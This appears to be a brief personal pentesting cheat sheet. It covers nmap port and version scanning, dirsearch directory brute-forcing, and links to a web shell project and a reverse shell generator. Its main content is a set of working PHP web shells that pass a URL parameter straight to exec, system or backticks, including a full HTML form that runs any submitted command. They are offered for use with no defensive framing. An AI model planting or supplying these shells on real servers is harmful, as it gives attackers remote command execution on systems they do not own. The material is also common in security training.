###### Network Exploit

No Ping
```bash
nmap -Pn IPv4
```

Specific Port
```bash
nmap -p portNumber IPv4
```

Check Version
```bash
nmap -sV IPv4
```

Other Commands
```txt
https://www.stationx.net/nmap-cheat-sheet/
```

###### Directory Search

Normal Search
```bash
dirseach -u target
```

Recursion Search
```bash
dirsearch -u target -r
```

Wordlist Search
```bash
dirsearch -u target --wordlist=path
```

###### Web shell

```php
<?= exec($_GET["a"]);?>
```

```php
<?= system($_GET["a"]);?>
```

```php
<?=`$_GET[1]`;
```

```php
<html>
<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
        <?php
            if(isset($_GET['cmd']))
            {
                system($_GET['cmd']);
            }
        ?>
    </pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Super Web Shell
```txt
https://github.com/flozz/p0wny-shell
```

Reverse Shell Generator 
```txt
https://www.revshells.com
```

